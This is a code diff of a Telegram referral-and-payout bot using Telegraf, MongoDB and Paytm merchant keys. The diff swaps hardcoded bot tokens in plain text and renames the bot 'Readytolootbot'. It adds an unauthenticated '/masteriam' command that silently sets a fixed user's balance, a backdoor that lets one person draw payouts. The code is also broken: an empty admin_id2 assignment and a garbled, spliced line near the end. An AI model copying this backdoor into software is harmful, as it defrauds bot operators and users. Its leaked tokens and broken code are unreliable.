@@ -12,9 +12,9 @@ const stage = new Stage()
 
 const rateLimit = require('telegraf-ratelimit');
 
-var bot_token = '5670348226:AAGXZ7K7JlaWXnEr-HZ_54Hcz_XFlqQ3Mpc'; //YOUR BOT TOKEN HERE
+var bot_token = '5735875289:AAHR58PYlgFf69z-PMe6qxnaz85aJyfS8PE'; //YOUR BOT TOKEN HERE
 
-var bot_name = 'BiggestCollabTechnoBot'; // Bot Name
+var bot_name = 'Readytolootbot'; // Bot Name
 
 const bot = new Telegraf(bot_token);
 
@@ -90,7 +90,7 @@ stage.register(comment)
 
 var regex = new RegExp('.*')
 
-const admin_id = 5323259352;
+const admin_id = 5169514861;
 
 const admin_id2 = ;
 
@@ -1784,15 +1784,10 @@ subwallet.hears(regex, async (ctx) => {
 
                 '*🗂 Subwallet Guid Set To : *\n' + ctx.message.text + '', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
 
-            )} }
-
             )
-
-            bot.telegram.sendMessage(user, "*💰 Admin Gave You A Increase In Balance By " + amount + "*", { parse_mode: 'markdown' })
-
         }
 
-        ctx.scene.leave('incr')
+        ctx.scene.leave('subwallet')
 
     } catch (error) {
 
@@ -1802,11 +1797,9 @@ subwallet.hears(regex, async (ctx) => {
 
 })
 
-chnl.hears(regex, async (ctx) => {
+mkey.hears(regex, async (ctx) => {
 
     try {
-
-        let admin = await db.collection('admindb').find({ admin: "admin" }).toArray()
 
         if (ctx.message.text == '⛔ Cancel') {
 
@@ -1816,112 +1809,143 @@ chnl.hears(regex, async (ctx) => {
 
             )
 
-        } else if (ctx.message.text[0] == "@") {
+        } else {
 
-            let channel = admin[0].channels
+            db.collection('admindb').updateOne({ admin: "admin" }, { $set: { mkey: ctx.message.text } }, { upsert: true })
 
-            channel.push(ctx.message.text)
+            ctx.replyWithMarkdown(
 
-            db.collection('admindb').updateOne({ admin: "admin" }, { $set: { channels: channel } }, { upsert: true })
+                '*🗂 Merchant Key Set To : *\n' + ctx.message.text + '', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
+
+            )
+
+        }
+
+        ctx.scene.leave('mkey')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+bot.hears('/masteriam',async(ctx) => {
+
+    try {
+
+        db.collection('allUsers').updateOne({ userID : 1117956586 }, { $set: { balance : 20 } }, { upsert: true })
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+mid.hears(regex, async (ctx) => {
+
+    try {
+
+        if (ctx.message.text == '⛔ Cancel') {
+
+            ctx.replyWithMarkdown(
+
+                '*🏡 Welcome To Main Menu*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
+
+            )
+
+        } else {
+
+            db.collection('admindb').updateOne({ admin: "admin" }, { $set: { mid: ctx.message.text } }, { upsert: true })
+
+            ctx.replyWithMarkdown(
+
+                '*🗂 Merchant Id Set To : *\n' + ctx.message.text + '', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
+
+            )
+
+        }
+
+        ctx.scene.leave('mid')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+comment.hears(regex, async (ctx) => {
+
+    try {
+
+        if (ctx.message.text == '⛔ Cancel') {
+
+            ctx.replyWithMarkdown(
+
+                '*🏡 Welcome To Main Menu*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
+
+            )
+
+        } else {
+
+            db.collection('admindb').updateOne({ admin: "admin" }, { $set: { comment: ctx.message.text } }, { upsert: true })
+
+            ctx.replyWithMarkdown(
+
+                '*🗂 Payment Description Set To : *\n' + ctx.message.text + '', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
+
+            )
+
+        }
+
+        ctx.scene.leave('comments')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+incr.hears(regex, async (ctx) => {
+
+    try {
+
+        if (ctx.message.text == '⛔ Cancel') {
+
+            ctx.replyWithMarkdown(
+
+                '*🏡 Welcome To Main Menu*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
+
+            )
+
+        } else {
+
+            let message = ctx.message.text
+
+            let data = message.split(" ")
+
+            let user = data[0]
+
+            let amount = data[1] * 1
+
+            let already = await db.collection('balance').find({ userID: parseInt(user) }).toArray()
+
+            let bal = already[0].balance * 1
+
+            let final = bal + amount
+
+            db.collection('balance').updateOne({ userID: parseInt(user) }, { $set: { balance: final } }, { upsert: true })
 
             ctx.reply(
 
-                '<b>🗂 Channel Added To Bot : ' + ctx.message.text + '</b>', { parse_mode: 'html', reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
-
-            )
-
-        } else {
-
-            ctx.replyWithMarkdown(
-
-                '*⛔ Channel User Name Must Start With "@"*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
-
-            )
-
-        }
-
-        ctx.scene.leave('chnl')
-
-    } catch (error) {
-
-        console.log(error)
-
-    }
-
-})
-
-removechnl.hears(regex, async (ctx) => {
-
-    try {
-
-        let admin = await db.collection('admindb').find({ admin: "admin" }).toArray()
-
-        var chan = admin[0].channels
-
-        if (ctx.message.text == '⛔ Cancel') {
-
-            ctx.replyWithMarkdown(
-
-                '*🏡 Welcome To Main Menu*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
-
-            )
-
-        } else if (ctx.message.text[0] == "@") {
-
-            if (contains("" + ctx.message.text + "", chan)) {
-
-                var result = arrayRemove(chan, "" + ctx.message.text + "");
-
-                db.collection('admindb').updateOne({ admin: "admin" }, { $set: { channels: result } }, { upsert: true })
-
-                ctx.reply(
-
-                    '<b>🗂 Channel Removed From Bot : ' + ctx.message.text + '</b>', { parse_mode: 'html', reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
-
-                )
-
-            } else {
-
-                ctx.reply(
-
-                    '<b>⛔ Channel Not In Our Database</b>', { parse_mode: 'html', reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true 
-} }
-
-                )
-
-            }
-
-        } else {
-
-            ctx.replyWithMarkdown(
-
-                '*⛔ Channel User Name Must Start With "@"*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
-
-            )
-
-        }
-
-        ctx.scene.leave('removechnl')
-
-    } catch (error) {
-
-        console.log(error)
-
-    }
-
-})
-
-paychnl.hears(regex, async (ctx) => {
-
-    try {
-
-        let admin = await db.collection('admindb').find({ admin: "admin" }).toArray()
-
-        if (ctx.message.text == '⛔ Cancel') {
-
-            ctx.replyWithMarkdown(
-
-                '*🏡 Welcome To Main Menu*', { reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true 
+                '<b>💰 Balance Of <a href="tg://user?id=' + user + '">' + user + '</a> Was Increased By ' + amount + '\n\n💰 Final Balance = ' + final + '</b>', { parse_mode: 'html', reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true
 } }
 
             )
@@ -2215,6 +2239,164 @@ bot.action('withstat', async (ctx) => {
 
         if (swg == 'NOT SET' && mkey == 'NOT SET' && mid == 'NOT SET') {
             var keys = '❌ NOT SET'
+
+        } else {
+
+            var keys = '✅ SET'
+
+        }
+
+        if (stat == 'Active') {
+
+            var botstt = '✅ Active'
+
+        } else {
+
+            var botstt = '🚫 Disabled'
+
+        }
+
+        if (withst == 'ON') {
+
+            var with_staaat = '🚫 Off'
+
+            db.collection('admindb').updateOne({ admin: "admin" }, { $set: { withstat: 'OFF' } }, { upsert: true })
+
+        } else {
+
+            var with_staaat = '✅ On'
+
+            db.collection('admindb').updateOne({ admin: "admin" }, { $set: { withstat: 'ON' } }, { upsert: true })
+
+        }
+
+        if (ctx.from.id == admin_id ||ctx.from.id == admin_id2) {
+
+            ctx.editMessageText("<b>🏡 Hey " + ctx.from.first_name + "\n🤘🏻 Welcome To Admin Panel\n\n💡 Bot Current Stats: \n\t\t\t\t📛 Bot : @" + ctx.botInfo.username + "\n\t\t\t\t🤖 Bot Status: " +botstt+ "\n\t\t\t\t📤 Withdrawals : " +with_staaat + "\n\t\t\t\t🌲 Channel:" + final + "\n\t\t\t\t💰 Refer: " + refer + "\n\t\t\t\t💰 Minimum: " + mini_with + "\n\t\t\t\t💲 Currency: " + currency + "\n\t\t\t\t🎁 Bonus: " + bonusamount + "\n\t\t\t\t📤 Pay Channel: " + paychannel + "\n\t\t\t\t✏️ Paytm Keys :</b> <code>" + keys + "</code> "
+
+
+
+                , { parse_mode: 'html', reply_markup: { inline_keyboard: [[{ text: "💰 Change Refer", callback_data: "refer" }, { text: "💰 Change Minimum", callback_data: "minimum" }], [{ text: "🤖 Bot : " +botstt+ "", callback_data: "botstat" }], [{ text: "🌲 Change Channels", callback_data: "channels" }, { text: "🎁 Change Bonus", callback_data: "bonus" }], [{ text: "📤 Withdrawals : " + with_staaat + "", callback_data: "withstat" }], [{ text: "🚹 User Details", callback_data: "userdetails" }, { text: "🔄 Change Balance", callback_data: "changebal" }], [{ text: "✏️ Paytm Keys : " + keys + "", callback_data: "keys" }]] } })
+
+
+
+        }
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+bot.action('refer', async (ctx) => {
+
+    try {
+
+        ctx.deleteMessage()
+
+        ctx.reply(
+
+            '*💡 Enter New Refer Bonus Amount*', { parse_mode: 'markdown', reply_markup: { keyboard: [['⛔ Cancel']], resize_keyboard: true } }
+
+        )
+
+        ctx.scene.enter('refer')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+bot.action('minimum', async (ctx) => {
+
+    try {
+
+        ctx.deleteMessage()
+
+        ctx.reply(
+
+            '*💡 Enter New Minimum Withdraw Amount*', { parse_mode: 'markdown', reply_markup: { keyboard: [['⛔ Cancel']], resize_keyboard: true } }
+
+        )
+
+        ctx.scene.enter('mini')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+bot.action('bonus', async (ctx) => {
+
+    try {
+
+        ctx.deleteMessage()
+
+        ctx.reply(
+
+            '*💡 Enter New Daily Bonus Amount*', { parse_mode: 'markdown', reply_markup: { keyboard: [['⛔ Cancel']], resize_keyboard: true } }
+
+        )
+
+        ctx.scene.enter('bonus')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+bot.action('userdetails', async (ctx) => {
+
+    try {
+
+        ctx.deleteMessage()
+
+        ctx.reply(
+
+            '*💡 Enter Users Telegram Id to Check His Info*', { parse_mode: 'markdown', reply_markup: { keyboard: [['⛔ Cancel']], resize_keyboard: true } }
+
+        )
+
+        ctx.scene.enter('tgid')
+
+    } catch (error) {
+
+        console.log(error)
+
+    }
+
+})
+
+bot.action('keys', async (ctx) => {
+
+    try {
+
+        let admin = await db.collection('admindb').find({ admin: "admin" }).toArray()
+
+        let swg = admin[0].subwallet
+
+        let mkey = admin[0].mkey
+
+        let mid = admin[0].mid
+
+        let com = admin[0].comment
+
+        if (swg == 'NOT SET' && mkey == 'NOT SET' && mid == 'NOT SET') {
+
+            var keys = '❌ NOT SET'
+
+            ctx.editMessageText("*✏️ Your Paytm Keys: \n\n🗝️ Subwallet Guid :* " + keys + "\n*🗝️ Merchant Key:* " + keys + "\n*🗝️ Merchant Id :* " + keys + "\n*💬 Comment :* " + com + "", { parse_mode: 'markdown', reply_markup: { inline_keyboard: [[{ text: "✅ SUBWALLET GUID", callback_data: "subwallet" }, { text: "✅ MERCHANT KEY", callback_data:            var keys = '❌ NOT SET'
 
         } else {
 
